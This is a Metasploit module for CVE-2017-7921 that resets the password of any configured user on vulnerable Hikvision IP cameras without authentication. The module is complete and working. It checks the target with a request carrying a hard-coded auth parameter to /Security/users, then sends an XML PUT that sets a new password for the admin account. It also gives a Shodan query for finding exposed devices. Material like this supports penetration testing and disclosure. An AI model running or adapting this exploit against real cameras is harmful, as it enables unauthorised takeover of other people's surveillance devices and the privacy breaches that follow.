# Exploit title: Hikvision IP Camera - Unauthenticated password reset (Metasploit)
# Author: H00die Gr3y
# Date: 2021-07-30
# Website: https://www.hikvision.com/en/
# Software: Hikvision Camera
# Versions: 
# DS-2CD2xx2F-I Series: V5.2.0 build 140721 to V5.4.0 build 160530
# DS-2CD2xx0F-I Series: V5.2.0 build 140721 to V5.4.0 Build 160401
# DS-2CD2xx2FWD Series: V5.3.1 build 150410 to V5.4.4 Build 161125
# DS-2CD4x2xFWD Series: V5.2.0 build 140721 to V5.4.0 Build 160414
# DS-2CD4xx5 Series: V5.2.0 build 140721 to V5.4.0 Build 160421
# DS-2DFx Series: V5.2.0 build 140805 to V5.4.5 Build 160928
# DS-2CD63xx Series: V5.0.9 build 140305 to V5.3.5 Build 160106

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  
  Rank = NormalRanking
  include Msf::Auxiliary::Report  
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Unauthenticated password change for any user configured at a vulnerable Hikvision IP Camera',
      'Description'    => %q{
          Many Hikvision IP cameras contain a backdoor that allows unauthenticated impersonation of any configured user account. 
          The vulnerability has been present in Hikvision products since 2014. 
          In addition to Hikvision-branded devices, it affects many white-labeled camera products sold under a variety of brand names. 
          Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time of publishing (shodan search: App-webs 200 OK product:"Hikvision IP Camera" port:"80"). 
          
          This Module allows the attacker to perform an unauthenticated password change of any vulnerable Hikvision IP Camera to gaining full administrative access. 
          The vulnerability can be exploited for all configured users.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 
        [
          'Monte Crypto', # Vulnerability discovery
          'H00die Gr3y' # Metasploit module author
        ],
      'References'     =>
        [
          [ 'CVE', '2017-7921' ],
          [ 'URL', 'https://packetstormsecurity.com/files/144097/Hikvision-IP-Camera-Access-Bypass.html' ],
          [ 'URL', 'https://ipvm.com/reports/hik-exploit' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2017/Sep/23' ]
        ],
      'Platform'       => 'linux',
      'Arch'           => ARCH_ARMLE,
      'Privileged'     => true,
      'Targets'        =>
        [
          [ 'Automatic', {} ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2017-09-23'))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('USERNAME', [ true, "Username for password change", 'admin']),
        OptString.new('PASSWORD', [ true, "New Password (at least 2 UPPERCASE, 2 lowercase and 2 special characters", 'Pa$$W0rd']),
        OptString.new('ID', [ true, "ID (default 1 for admin)", '1'])
      ])
  end

  def check
    begin
      uri = normalize_uri(target_uri.path,'/Security/users?auth=YWRtaW46MTEK')
      res = send_request_cgi({
      'uri'          => uri,
      'method'       => 'GET',
      })
    rescue
      print_error("#{peer} - Unable to connect to server")
      return Exploit::CheckCode::Unknown
    end
  
    if res.nil?
      return Exploit::CheckCode::Unknown
    elsif res && res.code == 200
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  
  end

  def run
    return unless check == Exploit::CheckCode::Vulnerable
    
    print_status("#{peer} - Starting the Exploit and sending the payload...")
    userXML = %Q^<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n<id>#{datastore['ID']}</id>\r\n<userName>#{datastore['USERNAME']}</userName>\r\n<password>#{datastore['PASSWORD']}</password>\r\n</User>^
    print_status("The payload: #{userXML}")

    uri = normalize_uri(target_uri.path,'/Security/users?auth=YWRtaW46MTEK')
      res = send_request_cgi({
      'uri'          => uri,
      'method'       => 'PUT',
      'ctype'        => 'application/xml',
      'data'         => userXML
      })  

    if res.nil?
      print_error("#{peer} - Unknown Error. Exploit was not sucessfull!")
      return
    elsif res && res.code == 200
      print_good("#{peer} - Boom !!! Password reset for user:#{datastore['USERNAME']} was successfull !!!")
      print_good("#{peer} - Please log in with your new password:#{datastore['PASSWORD']}")
      return
    else
      print_error("#{peer} - password reset was not sucessfull...")
      print_error("#{peer} - Please check the password rules and ensure that the user account/ID:#{datastore['USERNAME']}/#{datastore['ID']} exists!")
      return
    end

  end

end            
